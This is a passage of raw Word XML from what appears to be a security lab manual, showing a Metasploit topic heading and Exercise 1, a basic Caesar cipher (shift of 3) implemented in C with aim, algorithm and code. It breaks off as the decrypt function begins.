              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Arial"/>
                <w:color w:val="222222"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>METASPLOIT FRAMEWORK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1356" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C26F7" w:rsidTr="00281202">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="974" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7">
            <w:pPr>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4194" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1963" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRDefault="004C26F7" w:rsidP="004C26F7"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1356" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="004C26F7" w:rsidRPr="00337CBC" w:rsidRDefault="004C26F7" w:rsidP="00027F37">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00337CBC" w:rsidRPr="00C85E37" w:rsidRDefault="00337CBC" w:rsidP="00337CBC">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C74AC4" w:rsidRDefault="00C74AC4"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8B0F50" w:rsidRDefault="008B0F50" w:rsidP="00C74AC4">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00090D7C">
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>LAB MANUAL</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="7640"/>
        </w:tabs>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Ex. No.: 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Date:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="3780"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>CAESAR CIPHER</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="6" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>To implement Caesar Cipher technique using C.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="270" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="6" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="240"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240" w:hanging="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Declare two arrays to store plaintext and ciphertext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="138" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="240"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240" w:hanging="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Prompt the user to enter plaintext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="138" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="240"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240" w:hanging="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Loop till the end-of line marker comes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="138" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="460"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="460" w:hanging="220"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>get one plaintext character &amp; put the same in plaintext[] array and increment i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="149" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>apply caesar 3 key shift cipher on the character and store in ciphertext[] array and increment x.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="240"/>
        </w:tabs>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240" w:hanging="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>Print the ciphertext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="208" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="6" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="261" w:lineRule="auto"/>
        <w:ind w:right="6400"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int encrypt();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="4" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>int decrypt();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="250" w:lineRule="auto"/>
        <w:ind w:right="4160"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>char plaintext[50]={0},ciphertext[50]={0}; int c,d;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>int main()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="250" w:lineRule="auto"/>
        <w:ind w:left="180" w:right="7140"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>int option; do</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="180"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="250" w:lineRule="auto"/>
        <w:ind w:left="240" w:right="4040"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>printf("Press 1 to Encrypt Plaintext \n"); printf("Press 2 to Decrypt Ciphertext \n"); printf("Press 9 to Exit \n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="2" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="250" w:lineRule="auto"/>
        <w:ind w:left="240" w:right="5840"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>printf("Your option="); scanf("%d",&amp;option); switch(option)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="2" w:lineRule="exact"/>
      </w:pP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964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="300"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>case 1: encrypt();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="1020" w:right="3600"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>printf("Ciphertext : %s \n",ciphertext); break;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="300"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>case 2: decrypt();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="780" w:right="3880" w:firstLine="230"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>printf("Plaintext : %s \n",plaintext); break;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="300"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>case 9: break;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="300"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>default: printf("Enter valid option! \n");</w:t>
      </w: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964394">
      <w:pPr>
        <w:spacing w:line="250" w:lineRule="auto"/>
        <w:ind w:left="180" w:right="6320"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>}while(option!=9); return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000F3373" w:rsidRDefault="000F3373" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="page2"/>
      <w:bookmarkEnd w:id="1"/>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>int encrypt()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="261" w:lineRule="auto"/>
        <w:ind w:left="240" w:right="880"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>static int i=0,j=0; printf("\nPlaintext : ");getchar(); while((c=getchar()) != '\n')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="3" w:lineRule="exact"/>
      </w:pP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0F3373">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="480" w:right="-4130"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>plaintext[i++]=(char)c;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>ciphertext[j++]=(char)(c+3);</w:t>
      </w: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964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="240"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:ind w:left="60"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:spacing w:line="0" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
        </w:rPr>
        <w:t>int decrypt()</w:t>
      </w:r>
    </w:p>
